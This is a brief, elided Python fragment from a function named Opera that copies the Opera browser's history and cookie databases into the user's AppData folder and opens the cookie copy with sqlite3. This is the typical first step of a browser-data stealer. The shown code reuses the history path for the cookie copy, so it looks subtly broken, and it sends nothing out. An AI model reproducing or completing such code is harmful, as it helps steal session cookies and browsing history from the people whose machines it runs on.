...
def Opera():
    try:
        ...
        shutil.copy2(history_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyOPERA.db')
        ...
        shutil.copy2(history_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\cookiesOPERA.db')
        c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\cookiesOPERA.db')
        cursor = c.cursor()
